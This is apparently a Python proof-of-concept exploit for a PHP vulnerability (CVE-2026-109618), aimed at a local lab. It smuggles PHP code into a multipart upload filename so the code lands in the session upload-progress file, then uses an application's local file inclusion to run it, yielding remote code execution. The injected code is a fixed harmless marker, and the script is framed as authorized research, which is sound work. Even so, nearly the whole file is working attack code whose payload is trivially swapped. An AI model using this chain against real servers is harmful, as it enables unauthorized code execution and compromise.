#!/usr/bin/env python3
"""
CVE-2026-109618 research — Chain A full chain: filename injection + LFI → RCE.

Chain (both steps against the local lab only):
  1. Upload multipart with PHP code in the filename. PHP's rfc1867 handler
     stores the filename raw in the session file (upload_progress).
     Injected: `<?php echo "CHAIN_A_123"; ?>`
  2. Hit the application's LFI (lab/webroot/lfi.php? include($page)) with
     page = /tmp/sessions/sess_<sid>. include() parses session file content
     as PHP: serialized data outside <?php ?> is echoed, our injected tag
     executes, and the marker is returned over HTTP.

Requirements on a real target: an application-level LFI (that is the
pre-existing application flaw this chain piggybacks on).

Usage:
  python3 verify_chain_a_lfi.py --target http://127.0.0.1:18080
  (or --target http://127.0.0.1:18081 for the patched 8.2.35 lab)

The injected code is a FIXED benign marker (echo "CHAIN_A_123") — this is
a code-execution proof, not a general-purpose payload.

For authorized security testing only.
"""
import argparse
import socket
from urllib.parse import urlparse


def upload(host, port, path, sid, filename):
    boundary = "CHAINA"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n\r\nZ\r\n'
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode() + body

    s = socket.create_connection((host, port), timeout=15)
    s.sendall(req)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def get(host, port, path, query=""):
    req = (
        f"GET {path}{query} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()
    s = socket.create_connection((host, port), timeout=15)
    s.sendall(req)
    s.settimeout(10)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18080")
    ap.add_argument("--write-path", default="/app/upload.php",
                    help="Any endpoint in the lab (upload_progress triggers session write)")
    ap.add_argument("--lfi-path", default="/lfi.php",
                    help="The lab LFI endpoint")
    ap.add_argument("--sid", default="abcdef0123456789abcdef0123456789",
                    help="Must be a valid session id: 32 chars, hex only")
    args = ap.parse_args()

    u = urlparse(args.target)
    host = u.hostname
    port = u.port or 80

    print("[*] CVE-2026-109618 research — Chain A: filename injection + LFI")
    print(f"[*] Target: {args.target}")
    print()

    # Step 1: inject fixed benign PHP marker via upload filename.
    # Single quotes survive the double-quoted Content-Disposition filename
    # (rfc1867 only unescapes \" and \\). Bareword constants would be a
    # fatal Error in PHP 8 — use a string literal so the echo really runs.
    marker = "<?php echo 'CHAIN_A_123'; ?>"

    # Step 2 trigger reads the session file through the app's LFI.
    print(f"[1] Injecting marker via upload filename: {marker}")
    upload(host, port, args.write_path, args.sid, marker)
    print(f"    -> session file /tmp/sessions/sess_{args.sid} now contains the marker")

    # Step 2: trigger the application LFI on the session file.
    session_file = f"/tmp/sessions/sess_{args.sid}"
    print(f"\n[2] Triggering LFI: GET {args.lfi_path}?page={session_file}")
    resp = get(host, port, args.lfi_path, f"?page={session_file}")
    body = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else b""

    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO RESPONSE"
    print(f"    Response: {status}")

    print()
    print("[*] Looking for EXECUTED marker output in response body:")
    executed = b"CHAIN_A_123" in body and b"Fatal error" not in body \
        and b"Uncaught Error" not in body
    if executed:
        print("    [EVIDENCE] CHAIN_A_123 executed via LFI — Chain A RCE confirmed ✓")
        print()
        print("[*] Remote output (executed inside include()), marker context:")
        text = body.decode("latin1", "replace")
        i = text.find("CHAIN_A_123")
        print("    ..." + text[max(0, i - 60):i + 20].strip() + "...")
        print("    ^ marker executes here, cutting the serialized stream")
        rc = 0
    else:
        print("    [!] marker not found as executed output — check lab, sid, LFI path")
        rc = 1

    print()
    print("[*] Explanation: the upload_progress session file stores the filename")
    print("    verbatim; include() of the session file executes any <?php ?>")
    print("    block inside it. The marker is a fixed constant — proof of code")
    print("    execution, not an arbitrary payload primitive.")
    return rc


if __name__ == "__main__":
    raise SystemExit(main())